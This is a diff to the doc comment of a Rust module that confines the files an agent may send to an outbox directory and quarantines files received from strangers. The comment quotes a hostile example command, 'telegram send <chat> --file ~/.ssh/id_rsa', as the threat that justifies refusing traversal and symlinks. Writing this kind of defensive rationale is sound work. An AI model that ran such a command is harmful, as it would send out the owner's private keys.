@@ -1,28 +1,18 @@
-//! Files an agent may send, and files strangers send us.
+//! Files an agent may send, and files strangers send us. A permission question, not a
+//! feature — so the rule lives here once instead of in each messaging clapp.
 //!
-//! Attaching media looks like a feature and is really a permission question, so the rule
-//! lives here once rather than in each messaging clapp.
+//! **Sending is confined.** Grants are per-command: an agent can hold
+//! `Bash(telegram send:*)` and nothing else. If that verb took an absolute path the grant
+//! would quietly become "read any file here and publish it" —
+//! `telegram send <chat> --file ~/.ssh/id_rsa`. So [`outgoing`] resolves inside
+//! `<data>/outbox/` and refuses traversal, absolute paths, and symlinks out of it.
 //!
-//! ## Why sending is confined
+//! That is not a claim a shell-capable agent cannot copy a secret into the outbox first.
+//! It is the narrower, honest one: **this app never widens a grant it was given.**
 //!
-//! Clatch grants are per-command: an agent can hold `Bash(telegram send:*)` and nothing
-//! else. If that verb accepted an absolute path, the narrow grant would silently become
-//! "read any file on this machine and publish it to a chat of my choosing" —
-//! `telegram send <chat> --file ~/.ssh/id_rsa`. The app itself would be the exfiltration
-//! primitive. So an outgoing file is resolved **inside `<data>/outbox/`** and nowhere
-//! else: [`outgoing`] refuses traversal, absolute paths, and symlinks out of the box (a
-//! symlink is exactly how a confined directory stops being confined).
-//!
-//! This is not a claim that an agent with a full shell cannot copy a secret into the
-//! outbox first. It is the narrower, honest guarantee: **this app never widens a grant it
-//! was given.** What the human sees in `outbox/` is what can leave.
-//!
-//! ## Why receiving is quarantined
-//!
-//! An inbound file is bytes a stranger chose. We never trust the name they sent
-//! ([`store`] renames), never make it executable, cap it at [`MAX_BYTES`], and hand the
-//! agent a path plus the fact that it is untrusted. Opening it is the agent's decision,
-//! made knowingly.
+//! **Receiving is quarantined.** Inbound bytes are a stranger's choice: [`store`] renames
+//! (never their filename), never marks executable, caps at [`MAX_BYTES`], and hands the
+//! agent the path plus the fact that it is untrusted.
 
 use anyhow::{bail, Context, Result};
 use std::path::{Component, Path, PathBuf};
